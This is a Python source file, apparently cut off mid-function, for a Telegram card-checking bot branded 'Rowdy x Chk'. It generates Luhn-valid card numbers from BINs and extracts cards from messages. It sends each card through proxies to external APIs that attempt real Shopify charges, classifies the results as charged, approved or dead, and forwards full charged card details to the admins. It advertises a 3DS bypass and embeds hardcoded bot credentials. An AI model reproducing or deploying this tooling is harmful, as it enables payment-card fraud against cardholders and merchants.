from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta
import hashlib
import secrets
import sys
import math
from collections import Counter

# ==================== DIRECT API ENDPOINTS ====================
SHOPIFY_APIS = [
  "http://insaneee7xshopiify-production-38dc.up.railway.app/shopify",
  "http://chirag-x-shopify-production.up.railway.app/shopify",
  "http://chirag-x-shopify-production-6ead.up.railway.app/shopify",
  "http://chirag-x-shopify-production-e9ef.up.railway.app/shopify",
  "http://insaneee7xshopiify-production-38dc.up.railway.app/shopify",
  "https://new-one.up.railway.app/shopii",
]

# ==================== PREMIUM CUSTOM EMOJI IDS ====================
PREMIUM_EMOJI_IDS = {
    "💳": "5445353829304387411",
    "✅": "4956721670690702265", "❌": "4958526153955476488", "🔥": "4956499161319998529",
    "⚡": "4958479549265347295", "💠": "5343636681473935403",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5042290883949495533",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4956611513369494230", "💎": "4956719506027185156",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5120722716260828125", "⭐️": "5897501460509234625",
    "🆓": "5406756500108501710", "👑": "6089003761496232797", "🔍": "5258396243666681152",
    "⏱": "5343927661213279013", "💥": "5122933683820430249", "🆔": "4958642964181025908",
    "👤": "5445174334031166029", "📅": "6014861794059752708", "🔄": "6267229004311303657",
    "🏦": "5332455502917949981", "🥰": "5224450179368767019", "😱": "5447181973544008180",
    "🔷": "5226656353744862682", "🔑": "5454386656628991407", "🗓": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "4958926882994127612",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "6089140105233044310",
    "🎉": "5172632227871196306", "🎁": "6025929752982852543", "🚫": "5116151848855667552",
    "🛒": "5312361253610475399", "🔧": "4904936030232117798", "😎": "6062275913725252016",
    "⛔️": "5275969776668134187", "🥲": "4904468402782864209", "💐": "5211171480519337811",
    "🛡": "5219672809936006424", "📸": "5445344161333015312", "💬": "5447510826304959724",
    "😺": "5118590136149345664", "🌍": "4956560549287560231", "🤓": "5422553316808730347",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "🌟": "5310224206732996002", "✳": "5040071927750722576", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "✴": "6321225560789877992", "😇": "5195033767969839232",
    "👌": "5445350109862720603", "❇": "5039727497143387500", "⭐": "5042176294222037888",
    "🍭": "6267152480878990865", "🤠": "5377396889652060561", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "0️⃣": "6053163053980063912", "❣️": "4956222745814762495",
    "1️⃣": "6052991826518873591", "🕛": "5787488119490088755", "🫠": "5472250091332993630",
    "🙃": "5377710125911924926", "🤩": "5039727497143387500", "🫡": "5226656353744862682",
    "🌸": "5823478592515871391", "😏": "4956461073550017373", "😙": "6237864166879663987",
    "🤟": "6267225207560214192", "🤑": "6089140105233044310", "🥳": "5767137507879685567",
    "😥": "5040042498634810056", "🥶": "5283232570660634549", "🌻": "6332197763417118285",
    "📩": "6154448909784585982", "😋": "4958642964181025908", "♻": "4956719506027185156",
    "🟠": "5825848340721438908", "🔴": "4956719506027185156", "🟢": "6235478849417647339",
    "🤪": "5332455502917949981", "🔶": "5123248930124989216", "🏅": "5780864206177834457",
    "🥇": "5769547529993588669", "🥈": "6156436440260549720", "🥉": "6235355429237430006",
    "🏆": "6235403472741603087", "🤭": "5825806005228803076", "😄": "5438571934210082705",
    "🧨": "5989927820984327321", "🌌": "5990181988558969463", "🧐": "5825779518165488504",
    "🕘": "5258113901106580375", "✨": "6298612102709909362", "⚡️": "5042334757040423886",
    "🎉": "6282977077427702833", "💀": "6206110936789423908", "🎁": "6066395745139824604",
    "🌟": "5267500801240092311", "🤖": "5039727497143387500", "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495", "🛑": "5420323339723881652", "🔙": "6285315214673975495",
    "🏠": "6282977077427702833",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        if emoji in result:
            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ==================== BOT CONFIGURATION ====================
API_ID = 32143521
API_HASH = '273161fdfe0b9256e1baca74825672fb'
BOT_TOKEN = '9003076643:AAFdizhYHk1unaDPzdLDk-QsZ1OW0YGpiRk'

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
ADMIN_FILE = 'admin.txt'
KEYS_FILE = 'keys.txt'
STATS_FILE = 'stats.json'
START_VIDEO_FILE = 'start_video.txt'
GIFS_FILE = 'gifs.txt'

WORKER_COUNT = 150
PROGRESS_UPDATE_INTERVAL = 2.0
MAX_RETRIES = 15

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
http_session = None
_last_progress_update = {}
_last_progress_text = {}

def get_http_session():
    global http_session
    if http_session is None or http_session.closed:
        http_session = aiohttp.ClientSession()
    return http_session

# ==================== FILE OPERATIONS ====================
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def write_file_lines(filepath, lines):
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            for line in lines:
                f.write(f"{line}\n")
        return True
    except Exception as e:
        print(f"Error writing {filepath}: {e}")
        return False

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def load_banned_users(): return get_file_lines(BANNED_FILE)
def load_admins(): return get_file_lines(ADMIN_FILE)
def load_keys(): return get_file_lines(KEYS_FILE)
def load_start_video(): return get_file_lines(START_VIDEO_FILE)
def load_gifs(): return get_file_lines(GIFS_FILE)

def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_checks": 0, "total_hits": 0, "users": {}}
    try:
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"total_checks": 0, "total_hits": 0, "users": {}}

def save_stats(stats):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats, f, indent=2)
        return True
    except:
        return False

def is_premium(user_id): return str(user_id) in load_premium_users()
def is_banned(user_id): return str(user_id) in load_banned_users()
def is_admin(user_id): return str(user_id) in load_admins()

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'merchandise_expected_price_mismatch', 'payments_credit_card_generic',
    'payments_payment_flexibility_terms_id_mismatch', 'failed to get session token',
    'no valid payment method found', 'unable to get payment token',
    'cart failed with status 503', 'invalid json response', 'expecting value',
    'site not supported', 'no valid products', 'product price too high',
    'site requires login', 'proxy error', 'status: 4', 'site dead',
    'error processing card', 'generic_error', 'validation_custom',
    '429', 'rate limit', 'too many requests', '401', '403', '404', '<b>Proxy Dead!</b>', 'session token not found in HTML',
    'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT', 'NO_PRODUCT_FOUND',
    'Our minimum order is $15. Sticker fans: mix & match any 4+ designs, or grab the',
)

SITE_DEAD_TRIGGERS = [
    "request timeout", "timeout", "connection failed", "connection reset",
    "connection refused", "timed out", "site error", "site dead",
    "cloudflare", "cloudflare bypass failed", "captcha_required",
    "captcha required", "invalid url", "error in 1st req",
    "error in 1 req", "access denied", "tlsv1 alert", "ssl routines",
    "could not resolve", "domain name not found", "name or service not known",
    "openssl ssl_connect", "empty reply from server", "httperror504",
    "http error", "unreachable", "ssl error", "502", "503", "504",
    "bad gateway", "service unavailable", "gateway timeout",
    "network error", "failed to detect product", "failed to create checkout",
    "failed to tokenize card", "failed to get proposal data",
    "submit rejected", "submit rejected:", "handle error", "http 404",
    "delivery_delivery_line_detail_changed", "delivery_address2_required",
    "url rejected", "malformed input", "amount_too_small",
    "amount too small", "all products sold out", "no_session_token",
    "tokenize_fail", "merchandise_expected_price_mismatch",
    "payments_credit_card_generic", "error parsing submit",
    "payments_payment_flexibility_terms_id_mismatch",
    "failed to get session token", "no valid payment method found",
    "unable to get payment token", "cart failed with status 503",
    "invalid json response", "expecting value", "site not supported",
    "no valid products", "product price too high", "site requires login",
    "proxy error", "status: 4", "site dead", "error processing card",
    "generic_error", "validation_custom", "429", "rate limit",
    "too many requests", "401", "403", "404", "no valid", "<b>Proxy Dead!</b>", "session token not found in HTML", "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "NO_PRODUCT_FOUND",
    'Our minimum order is $15. Sticker fans: mix & match any 4+ designs, or grab the',
]

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

def generate_key():
    return secrets.token_hex(8).upper()

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10

def is_valid_card(card_number):
    if not card_number or len(card_number) < 13 or len(card_number) > 19:
        return False
    return luhn_checksum(card_number) == 0

def generate_cards(bin_number, count):
    cards = []
    bin_str = str(bin_number).strip()
    card_length = 16
    
    for _ in range(count):
        remaining_length = card_length - len(bin_str) - 1
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        card_without_checksum = bin_str + random_digits
        
        checksum = 0
        for i, digit in enumerate(reversed(card_without_checksum)):
            n = int(digit)
            if i % 2 == 0:
                n *= 2
                if n > 9:
                    n -= 9
            checksum += n
        
        checksum_digit = (10 - (checksum % 10)) % 10
        full_card = card_without_checksum + str(checksum_digit)
        
        year = random.randint(2026, 2030)
        month = random.randint(1, 12)
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        
        card_str = f"{full_card}|{month:02d}|{year}|{cvv}"
        cards.append(card_str)
    
    return cards

def is_card_expired(card):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return True
        month = int(parts[1])
        year = int(parts[2])
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if year < current_year or (year == current_year and month < current_month):
            return True
        return False
    except:
        return True

def clean_dead_cards(cards):
    valid_cards = []
    expired_count = 0
    invalid_count = 0
    
    for card in cards:
        parts = card.split('|')
        if len(parts) != 4:
            invalid_count += 1
            continue
        
        card_number = parts[0]
        
        if not is_valid_card(card_number):
            invalid_count += 1
            continue
        
        if is_card_expired(card):
            expired_count += 1
            continue
        
        valid_cards.append(card)
    
    return valid_cards, expired_count, invalid_count

async def get_random_gif():
    gifs = load_gifs()
    if gifs:
        return random.choice(gifs)
    return None

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def forward_charge_to_admin(card, result, user_id, username):
    try:
        admins = load_admins()
        if not admins:
            return
        
        gateway = result.get('gateway', 'Shopify Payments')
        price = result.get('price', '0.00')
        response_msg = result.get('message', 'Charged')
        
        message = f"""💎 <b>CHARGED HIT</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💳 Card    </b>  <code>{card}</code>
<b>💰 Amount  </b>  ${price}
<b>🔗 Gateway </b>  {gateway}
<b>📝 Result  </b>  {response_msg[:100]}
<b>👤 User    </b>  @{username}  <code>{user_id}</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""

        for admin_id in admins:
            try:
                await bot.send_message(int(admin_id), premium_emoji(message), parse_mode='html')
            except:
                pass
    except Exception as e:
        print(f"Error forwarding charge to admin: {e}")

async def check_card(card, site, proxy):
    global API_FAIL_COUNT
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                'status': 'Site Error',
                'message': 'Invalid card format',
                'card': card,
                'site': site,
                'gateway': 'Unknown',
                'price': '-',
                'retry': True
            }

        if not site.startswith("http"):
            site = f"https://{site}"

        api_url = random.choice(SHOPIFY_APIS)
        url = f"{api_url}?site={site}&cc={card}&proxy={proxy}"
        
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)

        response_msg = str(raw.get('Response', '')).strip()
        price = raw.get('Price', '-')
        gate = raw.get('Gateway', raw.get('Gate', '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮'))
        status = raw.get('Status', '')
        api_status = raw.get('Status', False)

        response_lower = response_msg.lower()

        if any(x in response_lower for x in SITE_DEAD_TRIGGERS):
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
            
            return {
                "status": "Site Error",
                "message": response_msg[:150] if response_msg else "Site Error",
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
                "site": site
            }

        async with API_FAIL_LOCK:
            if API_FAIL_COUNT > 0:
                API_FAIL_COUNT = 0

        is_rz = "razorpay" in gate.lower() or "rz" in gate.lower()
        if not is_rz:
            try:
                price_value = float(str(price).replace("$", "").replace("₹", "").strip())
                if price_value > 30:
                    return {
                        "status": "Site Error",
                        "message": f"Price ${price_value} > $30",
                        "card": card,
                        "retry": True,
                        "gateway": gate,
                        "price": price,
                        "site": site
                    }
            except:
                pass

        CHARGED_TRIGGERS = [
            "charged", "order completed", "order_placed", "order_paid",
            "thank you", "payment successful", "💎"
        ]
        
        if status == "Charged" or any(x in response_lower for x in CHARGED_TRIGGERS):
            return {
                'status': 'Charged',
                'message': response_msg[:150] if response_msg else "Charged",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        APPROVED_TRIGGERS = [
            'otp_required', 'approved', 'success', 'invalid_cvv',
            'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc',
            'incorrect cvc', 'incorrect_zip', 'incorrect zip',
            'insufficient_funds'
        ]
        
        if status == 'Approved' or any(x in response_lower for x in APPROVED_TRIGGERS):
            return {
                'status': 'Approved',
                'message': response_msg[:150] if response_msg else "Approved",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        if "card_declined" in response_lower or "declined" in response_lower:
            return {
                'status': 'Dead',
                'message': response_msg[:150] if response_msg else "CARD_DECLINED",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        if not api_status:
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
            
            return {
                'status': 'Site Error',
                'message': response_msg[:150] if response_msg else "API Status False",
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }

        return {
            'status': 'Site Error',
            'message': response_msg[:150] if response_msg else "Unknown Error",
            'card': card,
            'retry': True,
            'gateway': gate,
            'price': price,
            'site': site
        }

    except asyncio.TimeoutError:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
        
        return {
            'status': 'Site Error',
            'message': 'Request timeout',
            'card': card,
            'retry': True,
            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮',
            'price': '-',
            'site': site
        }
    
    except json.JSONDecodeError as e:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
        
        return {
            'status': 'Site Error',
            'message': f'Invalid JSON: {str(e)[:50]}',
            'card': card,
            'retry': True,
            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮',
            'price': '-',
            'site': site
        }
    
    except Exception as e:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
        
        return {
            'status': 'Site Error',
            'message': f'Error: {str(e)[:80]}',
            'card': card,
            'retry': True,
            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮',
            'price': '-',
            'site': site
        }

API_FAIL_COUNT = 0
API_FAIL_LOCK = asyncio.Lock()

async def check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮', 'price': '-', 'site': None}

    used_sites = set()
    used_proxies = set()

    for attempt in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            break
        site = random.choice(available_sites)
        used_sites.add(site)
        
        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            break
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)
        
        result = await check_card(card, site, proxy)
        result['site'] = site

        if not result.get('retry'):
            return result

        if attempt < max_retries - 2:
            await asyncio.sleep(0.3)

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝚒𝙛𝙮', 'price': '-', 'site': None}

async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User"):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0].get('gateway', 'Shopify Payments') if results['charged'] else (results['approved'][0].get('gateway', 'Shopify Payments') if results['approved'] else 'Shopify Payments')

    progress_percent = int((current_attempt_count / results['total']) * 100) if results['total'] > 0 else 0
    bar_length = 20
    filled = int(bar_length * progress_percent / 100)
    bar = "▰" * filled + "▱" * (bar_length - filled)

    progress_text = f"""<b>𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📊 𝐏𝐑𝐎𝗚𝗥𝐄𝐒𝐒 𝐑𝐄𝐏𝐎𝐑𝐓</b>

<code>{bar}</code> <b>{progress_percent}%</b>

<b>✅ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 :</b> {len(results['charged'])}
<b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 :</b> {len(results['approved'])}
<b>❌ 𝐃𝐞𝐚𝐝 :</b> {len(results['dead'])}
<b>⚠️ 𝐄𝐫𝐫𝐨𝐫𝐬 :</b> {results.get('errors', 0)}
<b>📦 𝐓𝐨𝐭𝐚𝐥 :</b> {results['total']}

<b>🎯 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 :</b> {current_attempt_count}/{results['total']}
<b>🔗 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜</b> {gateway}

<b>⏱️ 𝐓𝐢𝐦𝐞 :</b> {hours:02d}:{minutes:02d}:{seconds:02d}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", "pause"), Button.inline("▶️ Resume", "resume")],
        [Button.inline("🛑 Stop", "stop")]
    ]

    key = f"{user_id}_{message_id}"
    current_time = time.time()
    formatted_text = premium_emoji(progress_text)
    
    if key in _last_progress_update:
        time_diff = current_time - _last_progress_update[key]
        if time_diff < PROGRESS_UPDATE_INTERVAL and key in _last_progress_text and _last_progress_text[key] == formatted_text:
            return

    try:
        await bot.edit_message(user_id, message_id, formatted_text, buttons=buttons, parse_mode='html')
        _last_progress_update[key] = current_time
        _last_progress_text[key] = formatted_text
    except Exception as e:
        error_str = str(e).lower()
        if "not modified" in error_str:
            pass
        elif "wait" in error_str:
            try:
                wait_match = re.search(r'wait of (\d+) seconds', error_str)
                if wait_match:
                    wait_time = int(wait_match.group(1)) + 1
                    await asyncio.sleep(min(wait_time, 3))
                    try:
                        await bot.edit_message(user_id, message_id, formatted_text, buttons=buttons, parse_mode='html')
                        _last_progress_update[key] = time.time()
                        _last_progress_text[key] = formatted_text
                    except:
                        pass
            except:
                pass
        else:
            print(f"Error updating progress: {e}")

async def send_start_video_and_welcome(user_id, username, page="home"):
    start_videos = load_start_video()
    
    stats = load_stats()
    user_stats = stats.get('users', {}).get(str(user_id), {})
    
    if is_admin(user_id):
        plan = "👑 Admin"
    elif is_premium(user_id):
        plan = "💎 Premium"
    else:
        plan = "🔓 Free"
    
    welcome_text = f"""<b>⚡ 𝗥𝗼𝘄𝗱𝘆 𝘅 𝗖𝗵𝗸 — 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗖𝗵𝗲𝗰𝗸𝗲𝗿</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<b>💎 𝗣𝗟𝗔𝗡  </b> {plan}
<b>🆔 𝗨𝗦𝗘𝗥 </b> <code>{user_id}</code>

<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<b>🔗 𝗚𝗮𝘁𝗲𝘄𝗮𝘆  ·</b>  Stripe  ·  Shopify  ·  Adyen
<b>🛡 𝟯𝗗𝗦      ·</b>  Bypass Supported
<b>🌐 𝗣𝗿𝗼𝘅𝘆    ·</b>  HTTP  ·  SOCKS4  ·  SOCKS5
<b>⚡ 𝗦𝗽𝗲𝗲𝗱    ·</b>  150 Workers  ·  Rotating

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🚀 @Rowdyking07</b>"""

    main_buttons = [
        [
            Button.inline("💳 Checker", "show_cmds"),
            Button.inline("🛠 Tools", "tools_redirect"),
        ],
        [
            Button.inline("💎 Get Premium", "owner_redirect"),
            Button.inline("📊 My Stats", "user_stats"),
        ],
        [
            Button.url("📢 Updates", f"https://t.me/+I_2VKfDzJKIyOTQ1"),
            Button.url("👥 Group", f"https://t.me/+nPZ8PTVPs4AxNTY1"),
        ]
    ]

    try:
        if start_videos:
            video_url = random.choice(start_videos)
            await bot.send_file(user_id, video_url, caption=premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
        else:
            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
    except Exception as e:
        print(f"Error sending start video: {e}")
        try:
            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
        except:
            clean_text = re.sub(r'<[^>]+>', '', welcome_text)
            await bot.send_message(user_id, clean_text, buttons=main_buttons)

async def send_result_with_gif(user_id, message, gif=None):
    if not gif:
        gif = await get_random_gif()
    sent = None
    try:
        if gif:
            sent = await bot.send_file(user_id, gif, caption=premium_emoji(message), parse_mode='html')
        else:
            sent = await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception as e:
        print(f"Error sending result: {e}")
        try:
            sent = await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        except:
            pass
    return sent

async def send_otp_result(user_id, result, username):
    full_card = result['card']
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(full_card.split('|')[0])
    except:
        brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''
    
    user_role = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "🔓 Free"
    response_msg = result.get('message', 'OTP Required')
    
    if 'otp' in response_msg.lower():
        status_display = "𝐎𝐓𝐏_𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃 ⚠️"
    elif '3ds' in response_msg.lower():
        status_display = "𝟑𝐃𝐒_𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃 ⚠️"
    else:
        status_display = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
    
    price = result.get('price', '0.00')
    amount_display = f"🥶 ${price} USD"

    message = f"""⚠️ <b>{status_display.upper()}</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💳 Card    </b>  <code>{full_card}</code>
<b>📶 Status  </b>  {status_display}
<b>💰 Amount  </b>  {amount_display}
<b>📝 Result  </b>  {response_msg[:60]}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔢 BIN     </b>  <code>{full_card[:6]}</code>
<b>🏦 Bank    </b>  {bank}
<b>🌍 Country </b>  {country} {flag}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 By      </b>  @{username}  [{user_role}]
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    await send_result_with_gif(user_id, message)

async def send_animated_result(user_id, result, hit_type, username, is_premium_user=True):
    if hit_type == "Charged":
        status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃 ✅"
    elif hit_type == "Approved":
        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
    else:
        return

    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    except:
        brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''
    
    full_card = result['card']
    response_msg = result.get('message', 'No response')
    if len(response_msg) > 200:
        response_msg = response_msg[:200] + '...'

    user_role = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "🔓 Free"
    price = result.get('price', '0.00')
    amount_display = f"🥶 ${price} USD"

    emoji_hit = "💎" if hit_type == "Charged" else "✅"
    message = f"""{emoji_hit} <b>{hit_type.upper()}</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💳 Card    </b>  <code>{full_card}</code>
<b>📶 Status  </b>  {status_text}
<b>💰 Amount  </b>  {amount_display}
<b>📝 Result  </b>  {response_msg[:60]}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔢 BIN     </b>  <code>{full_card[:6]}</code>  ·  {brand}  ·  {level}
<b>🏦 Bank    </b>  {bank}
<b>🌍 Country </b>  {country} {flag}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 By      </b>  @{username}  [{user_role}]
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    sent = await send_result_with_gif(user_id, message)

    # Auto-pin every Charged hit
    if hit_type == "Charged" and sent is not None:
        try:
            await bot.pin_message(user_id, sent.id, notify=True)
        except Exception as pin_err:
            print(f"Auto-pin failed: {pin_err}")

async def send_dead_result(user_id, result, username):
    full_card = result['card']
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    except:
        brand, bin_type, level, bank, country, flag = '-', '-', '-', '-', '-', ''
    
    user_role = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "🔓 Free"

    message = f"""❌ <b>DECLINED</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💳 Card    </b>  <code>{full_card}</code>
<b>📶 Status  </b>  Dead · Card Declined
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔢 BIN     </b>  <code>{full_card[:6]}</code>
<b>🏦 Bank    </b>  {bank}
<b>🌍 Country </b>  {country} {flag}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 By      </b>  @{username}  [{user_role}]
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    await send_result_with_gif(user_id, message)

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_preview = ""
    if results['charged']:
        for r in results['charged'][:3]:
            hits_preview += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:3]:
            hits_preview += f"✅ <code>{r['card']}</code>\n"

    if not hits_preview:
